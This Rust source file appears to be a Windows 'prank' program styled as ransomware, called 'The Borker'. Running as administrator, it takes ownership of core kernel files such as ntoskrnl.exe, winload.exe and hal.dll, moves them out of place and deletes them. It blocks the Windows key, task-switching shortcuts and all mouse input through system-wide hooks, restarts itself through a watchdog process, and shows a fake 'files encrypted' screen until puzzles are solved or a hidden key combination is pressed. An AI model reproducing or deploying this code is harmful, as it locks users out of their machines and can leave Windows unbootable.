use macroquad::prelude::*;
use std::process::{Command, Stdio};
use std::env;
use std::fs;
use std::thread;
use std::time::Duration;
use std::sync::atomic::{AtomicBool, Ordering};
use windows_sys::Win32::UI::WindowsAndMessaging::{
    SetWindowsHookExW, UnhookWindowsHookEx, CallNextHookEx, WH_KEYBOARD_LL, KBDLLHOOKSTRUCT,
    WH_MOUSE_LL,
};
use windows_sys::Win32::UI::Input::KeyboardAndMouse::{
    VK_LWIN, VK_RWIN, VK_TAB, VK_ESCAPE, VK_F4, VK_CONTROL, VK_SHIFT, VK_F5, VK_F8,
};
use windows_sys::Win32::Foundation::{LRESULT, WPARAM, LPARAM, HINSTANCE};
use windows_sys::Win32::Storage::FileSystem::{
    SetFileAttributesW, DeleteFileW, FILE_ATTRIBUTE_NORMAL,
};

static HOOK_ACTIVE: AtomicBool = AtomicBool::new(true);

unsafe extern "system" fn keyboard_hook(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0 && HOOK_ACTIVE.load(Ordering::SeqCst) {
        let kbd = unsafe { *(lparam as *const KBDLLHOOKSTRUCT) };
        let vk = kbd.vkCode as u16;

        if vk == VK_LWIN || vk == VK_RWIN {
            return 1;
        }

        let alt_down = (kbd.flags & 0x20) != 0;
        if alt_down && (vk == VK_TAB || vk == VK_F4 || vk == VK_ESCAPE) {
            return 1;
        }

        if vk == VK_ESCAPE {
            use windows_sys::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
            let ctrl = (unsafe { GetAsyncKeyState(VK_CONTROL as i32) } as u16 & 0x8000) != 0;
            let shift = (unsafe { GetAsyncKeyState(VK_SHIFT as i32) } as u16 & 0x8000) != 0;
            if ctrl && shift {
                return 1;
            }
        }

        // Secret exit check within hook to ensure it's always responsive
        use windows_sys::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
        let f5 = (unsafe { GetAsyncKeyState(VK_F5 as i32) } as u16 & 0x8000) != 0;
        let f8 = (unsafe { GetAsyncKeyState(VK_F8 as i32) } as u16 & 0x8000) != 0;
        if f5 && f8 {
            // Let the game loop handle the exit logic via its own detection
        }
    }
    unsafe { CallNextHookEx(0, code, wparam, lparam) }
}

unsafe extern "system" fn mouse_hook(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0 && HOOK_ACTIVE.load(Ordering::SeqCst) {
        // Block all mouse messages to disable cursor movement and buttons
        return 1;
    }
    unsafe { CallNextHookEx(0, code, wparam, lparam) }
}

#[derive(Clone, Copy, Debug, PartialEq)]
enum State {
    Intro,
    Puzzle1,
    Puzzle2,
    Puzzle3,
    Success,
}

impl State {
    fn from_str(s: &str) -> Self {
        match s {
            "Puzzle1" => State::Puzzle1,
            "Puzzle2" => State::Puzzle2,
            "Puzzle3" => State::Puzzle3,
            "Success" => State::Success,
            _ => State::Intro,
        }
    }

    fn as_str(&self) -> &str {
        match self {
            State::Intro => "Intro",
            State::Puzzle1 => "Puzzle1",
            State::Puzzle2 => "Puzzle2",
            State::Puzzle3 => "Puzzle3",
            State::Success => "Success",
        }
    }
}

struct LogEntry {
    text: String,
}

fn window_conf() -> Conf {
    Conf {
        window_title: "The Borker - SYSTEM COMPROMISED".to_owned(),
        fullscreen: true,
        ..Default::default()
    }
}

use std::os::windows::process::CommandExt;
const CREATE_NO_WINDOW: u32 = 0x08000000;

const KERNEL_PATHS: &[&str] = &[
    r"C:\Windows\System32\ntoskrnl.exe",
    r"C:\Windows\System32\winload.exe",
    r"C:\Windows\System32\Boot\winload.exe",
    r"C:\Windows\System32\hal.dll",
];

/// Take ownership of a file as the current (Administrator) user,
/// then grant full control so we can delete it.
fn take_ownership(path: &str) {
    // takeown: make current user the owner
    let _ = Command::new("takeown")
        .args(["/F", path, "/A"])
        .creation_flags(CREATE_NO_WINDOW)
        .output();

    // icacls: grant Administrators full control
    let _ = Command::new("icacls")
        .args([path, "/grant", "Administrators:F", "/C"])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
}

/// Restore ownership of a file back to TrustedInstaller and reset permissions.
fn restore_ownership(path: &str) {
    // Grant TrustedInstaller full control back
    let _ = Command::new("icacls")
        .args([
            path,
            "/setowner",
            "NT SERVICE\\TrustedInstaller",
            "/C",
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output();

    // Remove the Administrators grant we added
    let _ = Command::new("icacls")
        .args([path, "/remove:g", "Administrators", "/C"])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
}

/// Strip file attributes and force-delete via Win32 API.
fn force_delete(path: &str) {
    let wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
    unsafe {
        SetFileAttributesW(wide.as_ptr(), FILE_ATTRIBUTE_NORMAL);
        DeleteFileW(wide.as_ptr());
    }
}

fn move_items() {
    for path in KERNEL_PATHS {
        let file_name = std::path::Path::new(path)
            .file_name()
            .unwrap()
            .to_str()
            .unwrap();
        let dest = format!(r"C:\{}", file_name);

        // Copy first — only proceed with delete if copy succeeded
        if fs::copy(path, &dest).is_ok() {
            take_ownership(path);
            force_delete(path);
        }
    }
}

fn return_items() {
    for path in KERNEL_PATHS {
        let file_name = std::path::Path::new(path)
            .file_name()
            .unwrap()
            .to_str()
            .unwrap();
        let src = format!(r"C:\{}", file_name);

        if fs::copy(&src, path).is_ok() {
            // Restore TrustedInstaller ownership now the file is back
            restore_ownership(path);
        }
    }
}

use windows_sys::Win32::Security::{GetTokenInformation, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

fn is_admin() -> bool {
    unsafe {
        let mut token = 0;
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
        let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
        let res = GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            size,
            &mut size,
        );
        if res == 0 {
            return false;
        }
        elevation.TokenIsElevated != 0
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let is_watchdog = args.iter().any(|arg| arg == "--watchdog");

    if !is_admin() && !is_watchdog {
        eprintln!("This application must be run as administrator.");
        // In a real GUI app, we might show a message box here, 
        // but since we have the manifest, this branch should rarely be hit 
        // unless the manifest is ignored or bypassed.
        std::process::exit(1);
    }

    if is_watchdog {
        run_watchdog(args);
    } else {
        // Create mock files if they don't exist, so the tools have something to "work" on
        for path in KERNEL_PATHS {
            if fs::metadata(path).is_err() {
                let _ = fs::write(path, "MOCK KERNEL DATA");
            }
        }

        move_items();
        macroquad::Window::from_config(window_conf(), game_loop());
    }
}

fn run_watchdog(args: Vec<String>) {
    let success_file = "934y38987848.done";
    let parent_pid: u32 = args.get(2).and_then(|s| s.parse().ok()).unwrap_or(0);
    loop {
        if fs::metadata(success_file).is_ok() {
            let _ = fs::remove_file(success_file);
            return;
        }

        if parent_pid != 0 {
            let output = Command::new("tasklist")
                .arg("/FI")
                .arg(format!("PID eq {}", parent_pid))
                .output();

            if let Ok(out) = output {
                let s = String::from_utf8_lossy(&out.stdout);
                if !s.contains(&parent_pid.to_string()) {
                    if let Ok(current_exe) = env::current_exe() {
                        let _ = Command::new(current_exe).spawn();
                        return;
                    }
                }
            }
        }
        thread::sleep(Duration::from_millis(500));
    }
}

async fn game_loop() {
    let success_file = "934y38987848.done";
    let watchdog_name = "934y38987848.exe";

    let current_exe = env::current_exe().expect("Failed to get current exe");
    let mut watchdog_path = current_exe.parent().unwrap().to_path_buf();
    watchdog_path.push(watchdog_name);

    if !watchdog_path.exists() {
        let _ = fs::copy(&current_exe, &watchdog_path);
    }

    let current_pid = std::process::id();
    show_mouse(false);

    let k_hook = unsafe {
        SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_hook), 0 as HINSTANCE, 0)
    };
    let m_hook = unsafe {
        SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_hook), 0 as HINSTANCE, 0)
    };

    let mut watchdog_child = Command::new(&watchdog_path)
        .arg("--watchdog")
        .arg(current_pid.to_string())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .ok();

    let state_file = "934y38987848.state";
    let mut state = if let Ok(s) = fs::read_to_string(state_file) {
        State::from_str(s.trim())
    } else {
        State::Intro
    };

    let mut logs: Vec<LogEntry> = Vec::new();
    let mut progress = if !matches!(state, State::Intro) { 1.0 } else { 0.0 };
    let mut timer = 0.0;
    let mut input_buffer = String::new();
    let mut message = String::new();
    let mut watchdog_check_timer = 0.0;

    let sol1 = "55";
    let sol2 = "BITF";
    let sol3 = "0XDEADBEEF";

    loop {
        clear_background(BLACK);

        // Secret exit shortcut F5 + F8
        if is_key_down(KeyCode::F5) && is_key_down(KeyCode::F8) {
            return_items();
            HOOK_ACTIVE.store(false, Ordering::SeqCst);
            if k_hook != 0 {
                unsafe { UnhookWindowsHookEx(k_hook) };
            }
            if m_hook != 0 {
                unsafe { UnhookWindowsHookEx(m_hook) };
            }
            show_mouse(true);
            let _ = fs::File::create(success_file);
            let _ = fs::remove_file(state_file);
            thread::sleep(Duration::from_millis(600));
            let _ = fs::remove_file(&watchdog_path);
            break;
        }

        if is_key_pressed(KeyCode::Escape) && matches!(state, State::Success) {
            HOOK_ACTIVE.store(false, Ordering::SeqCst);
            if k_hook != 0 {
                unsafe { UnhookWindowsHookEx(k_hook) };
            }
            if m_hook != 0 {
                unsafe { UnhookWindowsHookEx(m_hook) };
            }
            show_mouse(true);
            let _ = fs::File::create(success_file);
            let _ = fs::remove_file(state_file);
            thread::sleep(Duration::from_millis(600));
            let _ = fs::remove_file(&watchdog_path);
            break;
        }

        let time = get_time();
        let delta = get_frame_time();

        watchdog_check_timer += delta;
        if watchdog_check_timer > 2.0 {
            watchdog_check_timer = 0.0;
            let mut running = false;
            if let Some(ref mut child) = watchdog_child {
                if let Ok(None) = child.try_wait() {
                    running = true;
                }
            }
            if !running && !matches!(state, State::Success) {
                watchdog_child = Command::new(&watchdog_path)
                    .arg("--watchdog")
                    .arg(current_pid.to_string())
                    .stdout(Stdio::null())
                    .stderr(Stdio::null())
                    .creation_flags(CREATE_NO_WINDOW)
                    .spawn()
                    .ok();
            }
        }

        match state {
            State::Intro => {
                timer += delta;
                if timer > 0.1 && progress < 1.0 {
                    progress += 0.01;
                    timer = 0.0;
                    let fake_files = ["Documents", "Pictures", "Work", "System32_MOCK", "Private", "Vault", "Keyring"];
                    let file = fake_files[(time * 10.0) as usize % fake_files.len()];
                    logs.push(LogEntry {
                        text: format!(
                            "[ENCRYPTING] C:\\Users\\User\\{}\\{:04}.dat ... DONE",
                            file,
                            (time * 1000.0) as u32 % 9999
                        ),
                    });
                    if logs.len() > 15 {
                        logs.remove(0);
                    }
                }

                draw_text("You have been BORKED", 20.0, 40.0, 40.0, RED);
                draw_text("ALL YOUR FILES HAVE BEEN ENCRYPTED.", 20.0, 80.0, 30.0, WHITE);
                draw_text("DO NOT RESTART. DO NOT SHUT DOWN. YOUR COMPUTER WILL NOT BOOT AGAIN.", 20.0, 110.0, 30.0, RED);
                draw_text("SOLVE THE PUZZLES TO RESTORE ACCESS.", 20.0, 140.0, 25.0, GREEN);

                draw_rectangle(20.0, 180.0, 400.0, 30.0, DARKGRAY);
                draw_rectangle(20.0, 180.0, 400.0 * progress, 30.0, RED);
                draw_text(&format!("{:.0}%", progress * 100.0), 430.0, 205.0, 25.0, RED);

                let mut y = 240.0;
                for log in &logs {
                    draw_text(&log.text, 20.0, y, 18.0, GREEN);
                    y += 20.0;
                }

                if progress >= 1.0 {
                    draw_text(
                        "ENCRYPTION COMPLETE. PRESS [ENTER] TO START DECRYPTION PUZZLES.",
                        20.0, y + 20.0, 25.0, YELLOW,
                    );
                    if is_key_pressed(KeyCode::Enter) {
                        state = State::Puzzle1;
                        let _ = fs::write(state_file, state.as_str());
                        input_buffer.clear();
                    }
                }
            }
            State::Puzzle1 => {
                draw_text("PUZZLE 1/3: SEQUENCE ANALYSIS", 20.0, 40.0, 30.0, YELLOW);
                draw_text("IDENTIFY THE NEXT NUMBER IN THE SEQUENCE:", 20.0, 80.0, 25.0, WHITE);
                draw_text("1, 1, 2, 3, 5, 8, 13, 21, 34, ...?", 20.0, 120.0, 35.0, GREEN);

                draw_text("INPUT: ", 20.0, 200.0, 30.0, WHITE);
                draw_text(&input_buffer, 120.0, 200.0, 30.0, GREEN);

                if let Some(c) = get_char_pressed() {
                    if c.is_digit(10) {
                        input_buffer.push(c);
                    }
                }
                if is_key_pressed(KeyCode::Backspace) {
                    input_buffer.pop();
                }
                if is_key_pressed(KeyCode::Enter) {
                    if input_buffer == sol1 {
                        state = State::Puzzle2;
                        let _ = fs::write(state_file, state.as_str());
                        input_buffer.clear();
                        message.clear();
                    } else {
                        message = "WRONG.".to_string();
                        input_buffer.clear();
                    }
                }
                draw_text(&message, 20.0, 250.0, 20.0, RED);
            }
            State::Puzzle2 => {
                draw_text("PUZZLE 2/3: BINARY DECRYPTION", 20.0, 40.0, 30.0, YELLOW);
                draw_text("HEXADECIMAL STRING: 42 49 54 46", 20.0, 80.0, 25.0, WHITE);
                draw_text("CONVERT TO ASCII (4 CHARACTERS):", 20.0, 120.0, 30.0, WHITE);

                draw_text("INPUT: ", 20.0, 200.0, 30.0, WHITE);
                draw_text(&input_buffer, 120.0, 200.0, 30.0, GREEN);

                if let Some(c) = get_char_pressed() {
                    if input_buffer.len() < 4 && c.is_ascii_alphabetic() {
                        input_buffer.push(c.to_ascii_uppercase());
                    }
                }
                if is_key_pressed(KeyCode::Backspace) {
                    input_buffer.pop();
                }
                if is_key_pressed(KeyCode::Enter) {
                    if input_buffer == sol2 {
                        state = State::Puzzle3;
                        let _ = fs::write(state_file, state.as_str());
                        input_buffer.clear();
                        message.clear();
                    } else {
                        message = "WRONG.".to_string();
                        input_buffer.clear();
                    }
                }
                draw_text(&message, 20.0, 250.0, 20.0, RED);
            }
            State::Puzzle3 => {
                draw_text("PUZZLE 3/3: MASTER OVERRIDE", 20.0, 40.0, 30.0, YELLOW);
                draw_text("FIND THE FAULT IN THE KERNEL POINTER.", 20.0, 80.0, 25.0, WHITE);
                draw_text("HINT: FAMOUS HEXADECIMAL 'DEAD' VALUE (10 CHARS, INCL. 0X)", 20.0, 120.0, 20.0, WHITE);

                draw_text("INPUT: ", 20.0, 200.0, 30.0, WHITE);
                draw_text(&input_buffer, 120.0, 200.0, 30.0, GREEN);

                if let Some(c) = get_char_pressed() {
                    if input_buffer.len() < 10 {
                        input_buffer.push(c.to_ascii_uppercase());
                    }
                }
                if is_key_pressed(KeyCode::Backspace) {
                    input_buffer.pop();
                }
                if is_key_pressed(KeyCode::Enter) {
                    if input_buffer == sol3 {
                        state = State::Success;
                        let _ = fs::write(state_file, state.as_str());
                        return_items();
                        message.clear();
                    } else {
                        message = "WRONG.".to_string();
                        input_buffer.clear();
                    }
                }
                draw_text(&message, 20.0, 250.0, 20.0, RED);
            }
            State::Success => {
                draw_text("DECRYPTION SUCCESSFUL!", 20.0, 100.0, 50.0, GREEN);
                draw_text("SYSTEM RESTORED. FILES UNLOCKED.", 20.0, 160.0, 30.0, WHITE);
                draw_text("THANK YOU FOR PLAYING THE BORKER.", 20.0, 220.0, 25.0, YELLOW);
                draw_text("PRESS [ESCAPE] TO EXIT.", 20.0, 300.0, 20.0, WHITE);
            }
        }

        next_frame().await
    }
}